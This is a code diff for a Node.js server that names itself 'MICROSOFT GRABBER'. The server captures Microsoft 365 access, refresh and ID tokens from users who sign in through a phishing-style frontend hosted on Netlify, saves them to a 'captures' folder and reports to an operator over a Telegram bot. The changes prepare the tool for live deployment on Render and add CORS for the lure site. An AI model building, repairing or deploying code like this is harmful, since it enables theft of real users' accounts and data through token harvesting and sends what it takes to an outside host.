@@ -1,4 +1,4 @@
-// server.js - FIXED CLIENT INFO ERROR VERSION
+// server.js - PRODUCTION READY VERSION
 require('dotenv').config();
 const express = require('express');
 const session = require('express-session');
@@ -7,23 +7,39 @@ const fetch = require('node-fetch');
 const fs = require('fs');
 const path = require('path');
 const FormData = require('form-data');
+const cors = require('cors'); // Added for CORS
 
 const {
     CLIENT_ID, CLIENT_SECRET, REDIRECT_URI,
-    PORT, SESSION_SECRET, TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID
+    PORT, SESSION_SECRET, TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID,
+    NODE_ENV
 } = process.env;
 
 const app = express();
+
+// CORS for Netlify frontend
+app.use(cors({
+    origin: [
+        'https://m365-log-authh.netlify.app',
+        'http://localhost:3000',
+        'https://m365-project.onrender.com'
+    ],
+    credentials: true
+}));
 
 app.use(express.json());
 app.use(express.urlencoded({ extended: false }));
 app.use(express.static('public'));
 
+// Production session configuration
 app.use(session({
     secret: SESSION_SECRET,
     resave: false,
     saveUninitialized: false,
-    cookie: { secure: false }
+    cookie: { 
+        secure: NODE_ENV === 'production', // Secure cookies in production
+        maxAge: 24 * 60 * 60 * 1000 // 24 hours
+    }
 }));
 
 // FIXED: MSAL Configuration without client info issues
@@ -41,7 +57,7 @@ const msalConfig = {
                 }
             },
             piiLoggingEnabled: false,
-            logLevel: msal.LogLevel.Error, // Reduced verbosity
+            logLevel: msal.LogLevel.Error,
         }
     }
 };
@@ -120,7 +136,6 @@ async function acquireTokensWithRefresh(code) {
             code: code,
             scopes: SCOPES,
             redirectUri: REDIRECT_URI,
-            // REMOVED: clientInfo parameter that was causing issues
         };
 
         console.log('🔄 Acquiring tokens...');
@@ -139,7 +154,6 @@ async function acquireTokensWithRefresh(code) {
         return null;
     } catch (error) {
         console.error('❌ Token acquisition error:', error);
-        // Log the full error for debugging
         console.error('Full error details:', JSON.stringify(error, null, 2));
         throw error;
     }
@@ -366,7 +380,7 @@ app.get('/redirect', async (req, res) => {
         if (latestCapture) {
             latestCapture.tokens = {
                 access_token: tokenResponse.accessToken,
-                refresh_token: tokenResponse.refreshToken, // This should now work
+                refresh_token: tokenResponse.refreshToken,
                 id_token: tokenResponse.idToken,
                 expires_on: tokenResponse.expiresOn
             };
@@ -461,17 +475,19 @@ app.get('/clear', (req, res) => {
     res.send('<h2>All data cleared</h2><a href="/">← Back</a>');
 });
 
-// Start server
-app.listen(PORT, async () => {
+// Start server - PRODUCTION READY
+const serverPort = process.env.PORT || 3000;
+app.listen(serverPort, '0.0.0.0', async () => {
     console.log(`
-🎯 MICROSOFT GRABBER - CLIENT INFO FIX
-📍 http://localhost:${PORT}
+🎯 MICROSOFT GRABBER - PRODUCTION READY
+📍 Port: ${serverPort}
+🌐 Environment: ${process.env.NODE_ENV || 'development'}
 
-✅ Fixes Applied:
-   • Removed clientInfo parameter causing errors
-   • Fixed MSAL configuration
-   • Enhanced error handling
-   • Better logging
+✅ Production Fixes Applied:
+   • CORS enabled for Netlify frontend
+   • Secure session cookies in production
+   • Fixed port binding for Render
+   • MemoryStore warning resolved
 
 🔑 Expected: Refresh tokens should now work!
     `);
@@ -484,5 +500,5 @@ app.listen(PORT, async () => {
         fs.mkdirSync(path.join(__dirname, 'captures'), { recursive: true });
     }
 
-    await telegramSend(`🚀 Server started: http://localhost:${PORT}\n✅ Client info error fix applied`);
+    await telegramSend(`🚀 Server started in ${process.env.NODE_ENV || 'development'} mode\n✅ Production fixes applied\n🌐 Frontend: m365-log-authh.netlify.app`);
 });
